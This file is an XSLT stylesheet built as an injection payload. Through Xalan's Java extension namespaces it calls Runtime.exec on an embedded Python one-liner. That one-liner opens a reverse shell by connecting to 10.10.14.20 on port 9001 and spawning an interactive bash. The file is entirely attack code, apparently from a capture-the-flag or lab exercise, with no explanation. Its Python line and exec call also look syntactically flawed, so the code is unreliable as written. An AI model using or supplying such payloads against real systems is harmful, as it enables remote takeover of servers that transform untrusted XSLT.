<xsl:stylesheet version="1.0"
    xmlns:xsl="http://www.w3.org/1999/XSL/Transform"
    xmlns:rt="http://xml.apache.org/xalan/java/java.lang.Runtime"
    xmlns:py="http://xml.apache.org/xalan/java/org.python.util.PythonInterpreter"
    exclude-result-prefixes="rt py">

    <xsl:template match="/">
        <xsl:variable name="command">
          python3 -c 'import socket, subprocess as sp, os;conn = socket.socket(socket.AF_INET, socket.SOCK_STREAM);conn.connect(("10.10.14.20", 9001));for fd in range(3): os.dup2(conn.fileno(), fd);sp.call(["/bin/bash", "-i"])'
        </xsl:variable>

        <xsl:value-of select="rt:exec($command)"/>
    </xsl:template>
</xsl:stylesheet>
